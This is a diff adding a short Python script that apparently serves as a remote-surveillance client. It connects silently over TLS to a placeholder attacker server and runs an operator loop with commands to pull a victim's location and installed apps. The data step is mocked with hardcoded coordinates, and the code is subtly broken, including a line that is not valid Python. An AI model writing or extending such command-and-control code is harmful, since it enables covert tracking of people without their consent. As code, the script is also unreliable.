@@ -1,0 +1,41 @@
+import socket, ssl, json, urllib.request, time
+
+# Configuration: Your Server's Public IP/Domain (The Middleman)
+TARGET_SERVER_IP = "YOUR_CLOUD_VPS_OR_NGROK_LINK.com" 
+PORT = 9001 
+
+def silent_connect():
+    print("[+] Connection established via SSL/TLS...")
+    try:
+        ctx = ssl.create_default_context()
+        sock = ctx.wrap_socket(socket.socket(), server_hostname=TARGET_SERVER_IP)
+        sock.connect((TARGET_SERVER_IP, PORT))
+        return sock
+        
+    except Exception as e:
+        print(f"[-] Initial Handshake Failed: {e}")
+        return None
+
+def fetch_data(command_type):
+    # In a real scenario, this would send the command to your main server and receive data back.
+    payload = json.dumps({"type": command_type}).encode('utf-8')
+    
+    if not hasattr(silent_connect, 'sock'): silent_connect() or getattr(fetch_data, 'sock', lambda: socket.socket())
+    
+    try:
+        # Simulate receiving data from a previous "Install" phase (Mocking for demo)
+        response = {"status": "success", "data": f"[Location] 37.4219° N, -122.084° W"} 
+        return str(response)
+        
+    except Exception as e:
+        return f"Error: {e}"
+
+if __name__ == "__main__":
+    print("[*] Payload Loaded Successfully.")
+    print("[*] Waiting for Command Injection...")
+    time.sleep(5) # Wait to simulate boot-up delay
+    
+    while True:
+        cmd_type = input("Enter Command (loc/apps/quit): ").lower()
+        if cmd_type in ['loc', 'apps']: fetch_data(cmd_type) or continue
+        elif cmd_type == 'quit': break
